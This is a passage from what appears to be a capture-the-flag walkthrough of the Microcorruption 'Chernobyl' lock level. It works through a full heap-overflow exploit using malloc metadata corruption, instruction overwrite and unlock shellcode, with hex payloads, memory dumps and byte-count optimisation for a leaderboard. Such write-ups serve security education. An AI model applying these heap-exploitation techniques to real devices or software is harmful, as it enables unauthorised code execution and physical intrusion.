50a0: <mark>ffff</mark> 7400 0000 0000 0000 0000 0200 0000   ..t.............
50b0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
50c0: *  
</code></pre>

<p>It is also necessary that the size has the least significant bit (the "in-use" bit) set—otherwise, <code>malloc</code> will incorrectly interpret the corrupted chunk as free when the <code>rehash</code> function is allocating space for the new hash table. If the algorithm parses the chunk as free, it will cause the new hash table to partially overlap the old one—which is messy and unnecessary.</p>

<p><b>Hash table collision byte:</b> most of the time, there will need to be an extra byte that can be set to an arbitrary value so that the username will end up in the correct hash bucket (bucket zero).</p>

<h5>Without collision byte:</h5>
<pre><code>&gt;&gt;&gt; hash_username(b'cafe3030ffff') % 8
<mark>4</mark>
</code></pre>

<h5>With collision byte:</h5>
<pre><code>&gt;&gt;&gt; hash_username(b'cafe3030ffff' + b'<mark>74</mark>') % 8
<mark>0</mark>
</code></pre>

<pre><code class='language-ascii-noshadows'>┌───────┬─────┬───────────────────────────────────────────────┐
│       │HEX  │6e 65 77 20 ca fe 30 30 ff ff <mark>74</mark> 20 30 30 30 32│
│EXPLOIT├─────┼──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┤
│       │ASCII│n │e │w │  │  │  │0 │0 │  │  │t │  │0 │0 │0 │2 │
└───────┴─────┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┘
</code></pre>

<h3>Full PoC</h3>

<p>The test exploit, which should write the value <code>0xcafe</code> at address <code>0x3030</code>, is as follows from start to finish.</p> 

<h5>Padding Accounts:</h5>

<pre><code>new user05 0002;new user16 0002;new user27 0002;new user38 0002;new user49 0002</code></pre>

<h5>Heap Overflow (Hex):</h5>
<pre><code>6e657720cafe3030ffff742030303032</code></pre>

<h5>Rehash Trigger Accounts:</h5>
<pre><code>new user1 0002;new user2 0002;new user3 0002;new user4 0002;new user5 0002;new user6 0002
</code></pre>

<h3>Heap Exhaustion</h3>
<p>The above exploit fails with the "<code>Heap exhausted</code>" error message, and the processor halts execution.</p>

<h5>Output:</h5>
<pre><code>Adding user account user05 with pin 0002.
Adding user account user16 with pin 0002.
Adding user account user27 with pin 0002.
Adding user account user38 with pin 0002.
Adding user account user49 with pin 0002.
Adding user account 00t with pin 0002.
Adding user account user1 with pin 0002.
Adding user account user2 with pin 0002.
Adding user account user3 with pin 0002.
Adding user account user4 with pin 0002.
Adding user account user5 with pin 0002.
Adding user account user6 with pin 0002.
<mark>Heap exausted; aborting.</mark>
</code></pre>

<p>There is no data written at address <code>0x3030</code>.</p>

<pre><code>3030: <mark>0000 0000 0000</mark> 0000 0000 0000 0000 0000  ................
3040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
</code></pre>

<h4>Debugging</h4>

<p>This failure occurs when space is allocated for the new hash table and stems from a conditional in <code>malloc</code>. When traversing the double-linked list to search for free chunks, the algorithm has two ways to determine whether it is at the end (i.e., whether the heap is exhausted).</p> 

<ol>
	<li>Check whether <code>fd</code> is higher in memory than the <em>current chunk.</em></li>
	<li>Check whether <code>fd</code> is higher in memory than the <em>start of the heap.</em></li>
</ol>


<p>The heap starts at address <code>0x5000</code> on this firmware version—unlike Algiers, where it begins at a lower address than the stack. Here, both the stack and text segments reside in the <code>0x3000-0x4F00</code> range. Either of the above checks breaks the exploit because all realistic write targets are in lower memory than the heap.</p>


<p>Reverting the forward pointer to its original value and tweaking the collision byte corrects this error.</p>


<h5>Heap Overflow (Hex):</h5>
<pre><code>6e657720cafe<mark>fc50</mark>ffff<mark>70</mark>2030303032</code></pre>

<p>This exploit writes the forward pointer near address <code>0xfeca</code> (<code>0xcafe</code> after reversing the endianness).</p>

<pre><code>fec0: 0000 0000 0000 0000 0000 <mark>0000 fc50 0400</mark>   .............P..
fed0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
fee0: *  
</code></pre>

<h3>Random Write Primitive</h3>

<p>This constraint is problematic because it does not allow direct control of the value written. The traditional dlmalloc exploit uses the back pointer as the value to write and the forward pointer as the target address. For now, the forward pointer must point to a valid heap chunk higher in memory than the current one.</p>

<h3>Thinking Outside The Box</h3>


<p>DEP is absent on Chernobyl, so most people aim the back pointer at instruction memory and overwrite text segment code with the forward pointer. This technique is equivalent to being able to overwrite arbitrary words with <code>NOP</code> instructions.<label for="sn-1" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-1" class="sidenote-toggle" />
<span class="sidenote">
	This approach is very similar to technique #3 from the Algiers walkthrough mentioned earlier, except without the ability to control the value to write.
</span></p>

<p>The most common target is the following instruction.</p>

<br>
<hr>
      <figure>
        <img src="./images/chernobyl/chernobyl-stack-misalignment-nop.png"
          loading="eager" alt="Corrupting instruction memory to misalign the stack." />
      </figure>
      <hr>

      <p>This conditional block executes when the user supplies an invalid command. Corrupting the above instruction misaligns the stack frame and causes it to overlap a large buffer storing unparsed commands. The corrupted code will pop several words off the stack and then return to an attacker-controlled word.</p>

<h4>Exploit Modifications</h4>
<p>The existing exploit must be tweaked as follows.</p>

<h5>Heap Overflow (Hex):</h5>
<pre><code>6e657720<mark>c64c</mark>fc50ffff<mark>62</mark>2030303032</code></pre>

<p>After supplying the usual inputs, sending any character other than "<code>a</code>" or "<code>n</code>" will parse as an invalid command and cause the routine with the overwritten instruction to execute.</p>

<h5>Input:</h5>
<pre><code>test</code></pre>


<h5>Output:</h5>
<pre><code>Invalid command.</code></pre>

<p>The <code>run</code> function will then skip adding <code>0x600</code> to the stack pointer and crash after returning to the following null word.</p>

<pre><code>3dc0: 004d 0100 124d 7448 3a50 2450 0650 b849   .M...MtH:P$P.P.I
3dd0: 0800 0000 085a 0000 ff05 0650 0200 004d   .....Z.....P...M
3de0: 0300 744d 0000 0a00 ec3d 374c 7465 7374   ..tM.....&#x3D;7Ltest
3df0: 0000 0000 <mark>0000</mark> 0000 0000 0000 0000 0000   ................
</code></pre>

<h5>Debugger Output:</h5>
<pre><code>insn address unaligned
CPUOFF flag set; program no longer running. CPU must now be reset.
</code></pre>

<h4>Payload Code</h4>

<p>Achieving code execution requires substituting the "<code>test</code>" string with the following payload.</p>

<pre><code>324000ffb0121000ec3d</code></pre>

<p>This "command" contains the shellcode and return address.</p>


<pre><code class='language-ascii-noshadows'>┌───────────────────────┬───────┐
│SHELLCODE              │RETURN │
│                       │ADDRESS│
├─────┬─────┬─────┬─────┼───────┤
│32 40│00 ff│b0 12│10 00│ ec 3d │
└─────┴─────┴─────┴─────┴───┬───┘
   ▲                        │    
   └────────────────────────┘    
</code></pre>

<p>The return address above is at the same offset as the null word from earlier.</p>

<pre><code>3dc0: 004d 0100 124d 7448 3a50 2450 0650 b849   .M...MtH:P$P.P.I
3dd0: 0800 0000 085a 0000 ff05 0650 0200 004d   .....Z.....P...M
3de0: 0300 744d 0000 0a00 ec3d 374c 3240 00ff   ..tM.....=7L2@..
3df0: b012 1000 <mark>ec3d</mark> 0000 0000 0000 0000 0000   .....=..........
</code></pre>


<h4>Arbitrary Code Execution</h4>
<p>The final exploit is as follows, including the step to inject the shellcode and return address.</p>

<h5>Padding Accounts:</h5>

<pre><code>new user05 0002;new user16 0002;new user27 0002;new user38 0002;new user49 0002</code></pre>

<h5>Heap Overflow (Hex):</h5>
<pre><code>6e657720c64cfc50ffff622030303032</code></pre>

<h5>Rehash Trigger Accounts:</h5>
<pre><code>new user1 0002;new user2 0002;new user3 0002;new user4 0002;new user5 0002;new user6 0002
</code></pre>

<h5>Invalid Command Payload (Hex):</h5>

<pre><code>324000ffb0121000ec3d</code></pre>

<h5>Result</h5>
<pre><code>If you were not connected to the debug lock, the door would now be open.
Try running "solve" in the debug console to see if this solution works without the debugger attached.

The CPU completed in 125800 cycles.
</code></pre>

<h3>Summary</h3>
<p>The above exploit is inelegant but effective, accomplishing the practical objective of acquiring code execution. There are multiple issues with it, however.</p>

<ol>
	<li>It would be preferable to have an arbitrary write primitive. This exploit is dependent on a brittle implementation-specific behavior.</li>
	<li>It is too long to be anywhere near the top of the input size leaderboard.</li>
	</ol>

	<p>Dealing with these issues is necessary to shorten the exploit to 59 bytes.</p>

	<h2>Exploit Size Optimization</h2>
	<p>The current exploit is 194 bytes.</p>

	<pre><code>&gt;&gt;&gt; import binascii
&gt;&gt;&gt; len("new user05 0002;new user16 0002;new user27 0002;new user38 0002;new user49 0002")
79
&gt;&gt;&gt; len(binascii.unhexlify(b'6e657720c64cfc50ffff622030303032'))
16
&gt;&gt;&gt; len("new user1 0002;new user2 0002;new user3 0002;new user4 0002;new user5 0002;new user6 0002")
89
&gt;&gt;&gt; len(binascii.unhexlify(b'324000ffb0121000ec3d'))
10
&gt;&gt;&gt; 79+16+89+10
<mark>194</mark>
</code></pre>

<h3>Hitting Double Digit Leaderboard Rankings</h3>

<p>The immediate starting place is to shorten data that is not essential to the exploit as much as possible. Due to the large amount of non-printing characters, all further snippets represent the exploit stages in hex. The following Python function calculates the exploit size.</p>

<pre><code>def get_size(exploit_text):
	exploit = open(exploit_text, "r")
	commands = exploit.readlines()
	commands = [x.strip() for x in commands]
	length = sum([len(binascii.unhexlify(x.encode())) for x in commands])
	return length
</code></pre>

<h4>Avoiding Command Batching</h4>

<p>The semicolon that separates commands is an extra character. While convenient, nothing prevents each "<code>new</code>" command from being sent individually.</p>

<h4>Shortening Usernames</h4>

<p>Each username only needs to be a single byte. Single, non-printing characters work well.</p>

<pre><code>6e657720<mark>f0</mark>2030303032
6e657720<mark>e0</mark>2030303032
6e657720<mark>d0</mark>2030303032
6e657720<mark>c0</mark>2030303032
6e657720<mark>b0</mark>2030303032
6e657720c64cfc50ffff622030303032
6e657720<mark>aa</mark>2030303032
6e657720<mark>bb</mark>2030303032
6e657720<mark>cc</mark>2030303032
6e657720<mark>dd</mark>2030303032
6e657720<mark>ee</mark>2030303032
6e657720<mark>ff</mark>2030303032
324000ffb0121000ec3d
</code></pre>

<pre><code>&gt;&gt;&gt; get_size(&quot;exploit.txt&quot;)
<mark>136</mark>
</code></pre>


<h4>Eliminating Pins</h4>


<p>Recall that either a space or a null byte delimits the pin. Because the firmware clears the input buffer between reads, there is an implicit null byte after any input. This oddity means that omitting the pin from the "<code>new</code>" command causes the implementation to parse it as if it is zero.</p>

<h5>Input:</h5>
<pre><code>new a
</code></pre>

<h5>Output:</h5>
<pre><code>Adding user account a with pin 0000.
</code></pre>

<p>In other words, omitting the pin from every command is possible.</p>


<pre><code>6e657720f0
6e657720e0
6e657720d0
6e657720c0
6e657720b0
6e657720c64cfc50ffff62
6e657720aa
6e657720bb
6e657720cc
6e657720dd
6e657720ee
6e657720ff
324000ffb0121000ec3d
</code></pre>

<pre><code>&gt;&gt;&gt; get_size(&quot;exploit.txt&quot;)
<mark>76</mark></code></pre>

<h3>Null Username</h3>

<p>The implementation only parses the first byte of each command ("<code>a</code>" or "<code>n</code>") and ignores anything between the first byte and the fifth byte, which means that the following command is valid.</p>

<h5>Input:</h5>
<pre><code>n
</code></pre>

<h5>Output:</h5>
<pre><code>Adding user account  with pin 0000.
</code></pre>

<p>The above command only reads one byte into the input buffer. The rest of that buffer contains null bytes, which means that the offset where the username would usually start contains a null byte, which parses as the username. This bug allows shortening one of the "new" commands to only the letter "n".</p>

<pre><code>6e657720f0
6e657720e0
6e657720d0
6e657720c0
6e657720b0
6e657720c64cfc50ffff62
6e657720aa
6e657720bb
6e657720cc
6e657720dd
6e657720ee
<mark>6e</mark>
324000ffb0121000ec3d
</code></pre>

<p>This hack only works once, however. Attempting to do this a second time produces the following result.</p>

<h5>Output:</h5>
<pre><code>User already has an account.
</code></pre>

<p>While not immediately relevant from a length standpoint, this also means most characters in the "<code>new</code>" command are replaceable with nulls without side effects.</p>


<pre><code>6e<mark>000000</mark>f0
6e<mark>000000</mark>e0
6e<mark>000000</mark>d0
6e<mark>000000</mark>c0
6e<mark>000000</mark>b0
6e<mark>000000</mark>c64cfc50ffff62
6e<mark>000000</mark>aa
6e<mark>000000</mark>bb
6e<mark>000000</mark>cc
6e<mark>000000</mark>dd
6e<mark>000000</mark>ee
6e
324000ffb0121000ec3d
</code></pre>

<pre><code>&gt;&gt;&gt; get_size(&quot;exploit.txt&quot;)
<mark>72</mark>
</code></pre>

<h3>Theoretical Limits</h3>

<p>At this point, the exploit is 72 bytes long, and little can reduce the size without breaking it.<label for="sn-1" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-1" class="sidenote-toggle" />
<span class="sidenote">
Without getting into details, it is necessary to note that the overflow <em>must</em> occur in hash bucket zero and overwrite the heap metadata for hash bucket one—otherwise, the previous chunk merging forward will corrupt the overflowed back pointer. Avoiding reliance on the back pointer would require the capability to set the forward pointer to arbitrary addresses, which is impossible because that would break the linked list. The <code>free</code> function is only called after <code>malloc</code> follows the forward pointers to traverse the linked list, which means the heap exhaustion error will trigger before the arbitrary write.</span></p>




<h4>Pruning Excess Bytes</h4>

<p>The return address must remain at its current offset, or the implementation will return to a null word.</p>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000c64cfc50ffff62
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e000000ee
6e
324000ffb0121000<mark>ec3d</mark>
</code></pre>

<p>There must be padding preceding the return address to align it correctly, so making the shellcode shorter will not affect the length of the exploit. All accounts are the minimum possible length. There is only one place to prune: the overflow.</p>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000<mark>c64cfc50ffff62</mark>
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e000000ee
6e
324000ffb0121000ec3d
</code></pre>

<p>The collision byte, size, and forward pointer do not affect the overflow; they are set to the above values to avoid breaking the exploit, but there is a range that will work instead. There are two crucial requirements:</p>


<ol>
	<li>Avoid causing the "heap exhaustion" error.</li>
	<li>Ensure the overflow occurs in the correct hash bucket.</li>
	</ol>

<p>Given an eight-bucket hash table, any target address has a 1 in 8 chance of hashing to bucket zero. Supposing it does, that renders the forward pointer, size, and collision byte unnecessary.</p>

<p>Assuming the stars align perfectly, only overflowing the back pointer is required.</p>

<pre><code>6e000000<mark>c64c</mark></code></pre>

<p>This approach does not work in practice because the above target address does not hash to bucket zero when read as a username.</p>

<pre><code>&gt;&gt;&gt; hash_username(b'c64c') % 8
<mark>2</mark>
</code></pre>


<p>There may be other viable instructions or data structures resident at a location that hashes to bucket zero, but the address used up to this point (<code>0x4cc6</code>) does not.</p>

<p>Even if that were the case, the exploit size could shrink by no more than five bytes. It is thus impossible, using the random write primitive discussed heretofore, to craft an exploit shorter than 67 bytes. In the best-case scenario, that nets a leaderboard ranking in the top two dozen—a far cry from the 59-byte record.</p>

<h3>Hitting Top Fifteen</h3>
<p>Sixty-six bytes is the dividing line between people who understand the heap implementation and those who do not. Crossing this threshold requires an entirely different technique.</p>

<h4>Arbitrary Writes Via Size Field Arithmetic</h4>
<p>The crucial breakthrough is realizing that it is possible to abuse the size field to perform arbitrary writes. This technique was <a href="./algiers.html#technique-4">described previously</a> in the walkthrough for Algiers.</p>

<br>  
<div id="slides">
  <section id="technique-4-before-free">
<pre><code class='language-ascii-noshadows'> ┌────────┬────────┬────────┬──────────────────────────┐
 │  8888  │  cccc  │  eeee  │ .... .... .... .... .... │
 └────────┴────────┴──┬──┬──┴──────────────────────────┘
                      │  │
                      ▼  ▼
                     ┌────┐ ┌────┐ ┌────┐
                     │eeee│+│0000│+│000c│
                     └────┘ └────┘ └────┘
                             ▲  ▲
                             │  │
┌───────┬────────┬────────┬──┴──┴──┐
│DATA   │  0000  │  0000  │  0000  │
├───────┼────────┼────────┼────────┤
│ADDRESS│ 0x8888 │ 0x888a │ 0x888c │
└───────┴────────┴────────┴────────┘
</code></pre>
  </section>
  <section id="technique-4-after-free">
<pre><code class='language-ascii-noshadows'> ┌────────┬────────┬────────┬──────────────────────────┐
 │  8888  │  cccc  │  eeee  │ .... .... .... .... .... │
 └────────┴────────┴────────┴──────────────────────────┘


                            ┌────┐
                            │eefa│
                            └┬──┬┘
                             │  │
                             ▼  ▼
┌───────┬────────┬────────┬────────┐
│DATA   │  0000  │  0000  │  <mark>eefa</mark>  │
├───────┼────────┼────────┼────────┤
│ADDRESS│ 0x8888 │ 0x888a │ 0x888c │
└───────┴────────┴────────┴────────┘
</code></pre>
  </section>
</div>
<ul id="nav">
  <li><a href="#technique-4-before-free">Before Size Write</a></li>
  <li><a href="#technique-4-after-free">After Size Write</a></li>
</ul>


<p>In this case, avoiding <code>malloc</code> allocating the corrupted chunk and breaking the exploit requires setting the "in-use bit" on the size. That aside, the technique works the same way.</p>

<pre><code>&gt;&gt;&gt; shellcode_address &#x3D; 0x3df0
&gt;&gt;&gt; return_address &#x3D; 0x49a2
&gt;&gt;&gt; hex((shellcode_address-return_address-6+<mark>1</mark>) &amp; 0xffff)
&#39;<mark>0xf449</mark>&#39;
</code></pre>

<p>This exploit will add the corrupted size field to the return address for one of the calls to <code>free</code>.</p>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000ca3dfc50<mark>49f4</mark>fa
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
6e000000324000ffb01210
</code></pre>

<p>Additionally, there is no need to provide an invalid command at the end, as execution is redirected just after the first call to <code>free</code>. This change allows the omission of the null byte at the end of the shellcode—saving one byte. The shellcode can also be sent as the last username to trigger the rehash.</p>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000ca3dfc5049f4fa
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
6e000000<mark>324000ffb01210</mark>
</code></pre>

<pre><code>&gt;&gt;&gt; get_size(&quot;exploit.txt&quot;)
<mark>68</mark>
</code></pre>

<h4>Injecting Shellcode In Command Names</h4>

<p>The firmware only parses the first letter of the command, which is what allows the substitution of the "e", "w", and space characters in the "new" command with nulls. Seeing as these bytes are unused anyway, nothing prevents shellcode from being stored there.</p>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000ca3dfc5047f4fc
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
6e00<mark>324000ffb01210</mark>
</code></pre>

<p>Accounting for the shellcode shifting two bytes lower in memory requires tweaking the size field and collision byte.</p>


<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000ca3dfc50<mark>47f4fc</mark>
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
6e00324000ffb01210
</code></pre>

<p>There is a minor hiccup, as the above exploit fails with the following error.</p>


<h5>Output:</h5>

<pre><code>Adding user account  with pin 0000.
Adding user account  with pin 0000.
Adding user account  with pin 0000.
Adding user account  with pin 0000.
Adding user account  with pin 0000.
Adding user account =PI with pin 0000.
Adding user account  with pin 0000.
Adding user account  with pin 0000.
Adding user account  with pin 0000.
Adding user account  with pin 0000.
Adding user account  with pin 0000.
<mark>User already has an account.</mark>
</code></pre>

<p>This issue results from the following byte in the shellcode.</p>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000ca3dfc5047f4fc
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
6e003240<mark>00</mark>ffb01210
</code></pre>


<p>Recall how the preceding command works. Sending <code>6e</code> is equivalent to sending <code>6e00000000</code>. Notice the following pattern.</p>

<h5>Example Null Username</h5>
<pre><code>6e000000<mark>00</mark></code></pre>

<h5>Injected Shellcode</h5>
<pre><code>6e003240<mark>00</mark>ffb01210</code></pre>

<p>Sending <code>6e</code> by itself earlier added a single null byte username. The third byte of the shellcode, also null, is parsed as a username. The implementation will thus throw an error because this payload inadvertently adds the same username twice.</p>

<h4>Abusing Status Register Flags</h4>
<p>Recall that the shellcode disassembles to the following instructions.</p>

<pre><code>3240 00ff      mov      #0xff00, sr
b012 1000      call     #0x10
</code></pre>

<p>The status register (<code>SR</code>) contains a series of bitwise flags. The upper eight bits must contain <code>0xFF</code> to trigger the unlock interrupt, but the lower eight can be a range of values without affecting the interrupt call.</p>

<pre><code>3240 <mark>00</mark>ff      mov      #0xff<mark>00</mark>, sr
b012 1000      call     #0x10
</code></pre>

<p>Setting the lower byte to <code>0x01</code> is sufficient to avoid nulls.</p>


<pre><code>3240 <mark>01</mark>ff      mov      #0xff<mark>01</mark>, sr
b012 1000      call     #0x10
</code></pre>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000ca3dfc5047f4fc
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
6e003240<mark>01</mark>ffb01210
</code></pre>

<p>The above input triggers the unlock interrupt successfully.<label for="sn-1" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-1" class="sidenote-toggle" />
<span class="sidenote">
A backend change altered how interrupt calls interpret the contents of <code>SR</code>, which breaks this particular exploit. It still works on <a href="https://github.com/cemeyer/msp430-emu-uctf">older emulators</a>, however.</span> The length of the exploit is now sixty-six bytes.</p>

<pre><code>&gt;&gt;&gt; get_size(&quot;exploit.txt&quot;)
<mark>66</mark></code></pre>

<h3>Leaderboard Ranking</h3>
<p>This length puts the exploit at 15th place globally on the Chernobyl exploit size leaderboard.</p>

      <br>
      <table>
        <caption>Chernobyl Exploit Size Leaderboard</caption>
        <thead>
          <tr>
            <th>Position</th>
            <th>Username</th>
            <th>Exploit Size (Bytes)</th>
          </tr>
        </thead>
        <tbody>
          <tr>
		  <td><code>1st</code></td>
		  <td><code>ThatsMe</code></td>
		  <td><code>59</code></td>
          </tr>
          <tr>
		  <td><code>...</code></td>
		  <td><code>...</code></td>
		  <td><code>..</code></td>
          </tr>
          <tr>
		  <td><code><mark>15th</mark></code></td>
		  <td><code>b9ek</code></td>
		  <td><code>66</code></td>
          </tr>
        </tbody>
      </table>

<h3>Hitting Top Five</h3>
<h4>Sixty-Five Bytes</h4>

<p>Previous exploits assume the forward pointer must be <code>0x50fc</code>, or it will break the linked list and cause <code>malloc</code> to emit the heap exhaustion error. This axiom is invalid. Observe the structure of the forward pointers in the linked list.</p>

<pre><code class='language-ascii-noshadows'>      ┌─────────────────────────────────────────┐
      ▼                                         │
5000: 0050 1050 1500 0000 0300 0500 1650 2c50   │
5010: 0050 2650 2100 4250 a250 0251 6251 c251   │
5020: 2252 8252 e252 1050 3c50 2100 0000 0000   │
5030: 0000 0000 0000 0000 0000 0000 2650 <mark>9c50</mark>─┐ │
5040: b500 0000 0000 0000 0000 0000 0000 0000 │ │
5050: 0000 0000 0000 0000 0000 0000 0000 0000 │ │
5060: *                             ┌─────────┘ │
                                    ▼           │
5090: 0000 0000 0000 0000 0000 0000 3c50 <mark>fc50</mark>─┐ │
50a0: b500 0000 0000 0000 0000 0000 0000 0000 │ │
50b0: 0000 0000 0000 0000 0000 0000 0000 0000 │ │
50c0: *                             ┌─────────┘ │
                                    ▼           │
50f0: 0000 0000 0000 0000 0000 0000 9c50 <mark>5c51</mark>─┐ │
5100: b500 0000 0000 0000 0000 0000 0000 0000 │ │
5110: 0000 0000 0000 0000 0000 0000 0000 0000 │ │
5120: *                             ┌─────────┘ │
                                    ▼           │
5150: 0000 0000 0000 0000 0000 0000 fc50 <mark>bc51</mark>─┐ │
5160: b500 0000 0000 0000 0000 0000 0000 0000 │ │
5170: 0000 0000 0000 0000 0000 0000 0000 0000 │ │
5180: *                             ┌─────────┘ │
                                    ▼           │
51b0: 0000 0000 0000 0000 0000 0000 5c51 <mark>1c52</mark>─┐ │
51c0: b500 0000 0000 0000 0000 0000 0000 0000 │ │
51d0: 0000 0000 0000 0000 0000 0000 0000 0000 │ │
51e0: *                             ┌─────────┘ │
                                    ▼           │
5210: 0000 0000 0000 0000 0000 0000 bc51 <mark>7c52</mark>─┐ │
5220: b500 0000 0000 0000 0000 0000 0000 0000 │ │
5230: 0000 0000 0000 0000 0000 0000 0000 0000 │ │
5240: *                             ┌─────────┘ │
                                    ▼           │
5270: 0000 0000 0000 0000 0000 0000 1c52 <mark>dc52</mark>─┐ │
5280: b500 0000 0000 0000 0000 0000 0000 0000 │ │
5290: 0000 0000 0000 0000 0000 0000 0000 0000 │ │
52a0: *                             ┌─────────┘ │
                                    ▼           │
52d0: 0000 0000 0000 0000 0000 0000 7c52 <mark>3c53</mark>─┐ │
52e0: b500 0000 0000 0000 0000 0000 0000 0000 │ │
52f0: 0000 0000 0000 0000 0000 0000 0000 0000 │ │
5300: *                             ┌─────────┘ │
                                    ▼           │
5330: 0000 0000 0000 0000 0000 0000 dc52 <mark>0050</mark>───┘
5340: 7cf9 0000 0000 0000 0000 0000 0000 0000    
5350: 0000 0000 0000 0000 0000 0000 0000 0000    
5360: *                                          
</code></pre>


<p>The <code>rehash</code> function calls <code>malloc</code> multiple times to allocate space for the new hash table. During those calls, <code>malloc</code> will follow the forward pointers while checking the size field for each chunk to see if it is free and large enough to hold the allocation. Eventually, it will get to the chunk that satisfies both constraints: the wilderness chunk.</p>

<pre><code class='language-ascii-noshadows'>      ┌─────────────────────────────────────────┐
      ▼                                         │
5000: 0050 1050 1500 0000 0300 0500 1650 2c50   │
5010: 0050 2650 2100 4250 a250 0251 6251 c251   │
5020: 2252 8252 e252 1050 3c50 2100 0000 0000   │
5030: 0000 0000 0000 0000 0000 0000 2650 9c50─┐ │
5040: b500 0000 0000 0000 0000 0000 0000 0000 │ │
5050: 0000 0000 0000 0000 0000 0000 0000 0000 │ │
5060: *                             ┌─────────┘ │
                                    ▼           │
5090: 0000 0000 0000 0000 0000 0000 3c50 fc50─┐ │
50a0: b500 0000 0000 0000 0000 0000 0000 0000 │ │
50b0: 0000 0000 0000 0000 0000 0000 0000 0000 │ │
50c0: *                             ┌─────────┘ │
                                    ▼           │
50f0: 0000 0000 0000 0000 0000 0000 9c50 5c51─┐ │
5100: b500 0000 0000 0000 0000 0000 0000 0000 │ │
5110: 0000 0000 0000 0000 0000 0000 0000 0000 │ │
5120: *                             ┌─────────┘ │
                                    ▼           │
5150: 0000 0000 0000 0000 0000 0000 fc50 bc51─┐ │
5160: b500 0000 0000 0000 0000 0000 0000 0000 │ │
5170: 0000 0000 0000 0000 0000 0000 0000 0000 │ │
5180: *                             ┌─────────┘ │
                                    ▼           │
51b0: 0000 0000 0000 0000 0000 0000 5c51 1c52─┐ │
51c0: b500 0000 0000 0000 0000 0000 0000 0000 │ │
51d0: 0000 0000 0000 0000 0000 0000 0000 0000 │ │
51e0: *                             ┌─────────┘ │
                                    ▼           │
5210: 0000 0000 0000 0000 0000 0000 bc51 7c52─┐ │
5220: b500 0000 0000 0000 0000 0000 0000 0000 │ │
5230: 0000 0000 0000 0000 0000 0000 0000 0000 │ │
5240: *                             ┌─────────┘ │
                                    ▼           │
5270: 0000 0000 0000 0000 0000 0000 1c52 dc52─┐ │
5280: b500 0000 0000 0000 0000 0000 0000 0000 │ │
5290: 0000 0000 0000 0000 0000 0000 0000 0000 │ │
52a0: *                             ┌─────────┘ │
                                    ▼           │
52d0: 0000 0000 0000 0000 0000 0000 7c52 3c53─┐ │
52e0: b500 0000 0000 0000 0000 0000 0000 0000 │ │
52f0: 0000 0000 0000 0000 0000 0000 0000 0000 │ │
5300: *                             ┌─────────┘ │
                                    ▼           │
5330: 0000 0000 0000 0000 0000 0000 <mark>dc52 0050</mark>───┘
5340: <mark>7cf9</mark> 0000 0000 0000 0000 0000 0000 0000    
5350: 0000 0000 0000 0000 0000 0000 0000 0000    
5360: *                                          
</code></pre>

<p>As long as <code>malloc</code> can traverse the linked list and eventually reach the wilderness chunk, heap exhaustion will not occur. Aiming the corrupted forward pointer at any subsequent chunk accomplishes this.</p>

<pre><code class='language-ascii-noshadows'>5000: 0050 1050 1500 0000 0300 0500 1650 2c50              
5010: 0050 2650 2100 4250 a250 0251 6251 c251              
5020: 2252 8252 e252 1050 3c50 2100 0000 0000              
5030: 0000 0000 0000 0000 0000 0000 2650 9c50─┐            
5040: b500 0000 0000 0000 0000 0000 0000 0000 │            
5050: 0000 0000 0000 0000 0000 0000 0000 0000 │            
5060: *                             ┌─────────┘            
                                    ▼                      
5090: 0000 0000 0000 0000 0000 0000 3c50 <mark>????</mark>─┬─┬─┬─┬─┬─┬─┐
50a0: b500 0000 0000 0000 0000 0000 0000 0000 │ │ │ │ │ │ │
50b0: 0000 0000 0000 0000 0000 0000 0000 0000 │ │ │ │ │ │ │
50c0: *                             ┌─────────┘ │ │ │ │ │ │
                                    ▼           │ │ │ │ │ │
50f0: 0000 0000 0000 0000 0000 0000 9c50 5c51   │ │ │ │ │ │
5100: b500 0000 0000 0000 0000 0000 0000 0000   │ │ │ │ │ │
5110: 0000 0000 0000 0000 0000 0000 0000 0000   │ │ │ │ │ │
5120: *                             ┌───────────┘ │ │ │ │ │
                                    ▼             │ │ │ │ │
5150: 0000 0000 0000 0000 0000 0000 fc50 bc51     │ │ │ │ │
5160: b500 0000 0000 0000 0000 0000 0000 0000     │ │ │ │ │
5170: 0000 0000 0000 0000 0000 0000 0000 0000     │ │ │ │ │
5180: *                             ┌─────────────┘ │ │ │ │
                                    ▼               │ │ │ │
51b0: 0000 0000 0000 0000 0000 0000 5c51 1c52       │ │ │ │
51c0: b500 0000 0000 0000 0000 0000 0000 0000       │ │ │ │
51d0: 0000 0000 0000 0000 0000 0000 0000 0000       │ │ │ │
51e0: *                             ┌───────────────┘ │ │ │
                                    ▼                 │ │ │
5210: 0000 0000 0000 0000 0000 0000 bc51 7c52         │ │ │
5220: b500 0000 0000 0000 0000 0000 0000 0000         │ │ │
5230: 0000 0000 0000 0000 0000 0000 0000 0000         │ │ │
5240: *                             ┌─────────────────┘ │ │
                                    ▼                   │ │
5270: 0000 0000 0000 0000 0000 0000 1c52 dc52           │ │
5280: b500 0000 0000 0000 0000 0000 0000 0000           │ │
5290: 0000 0000 0000 0000 0000 0000 0000 0000           │ │
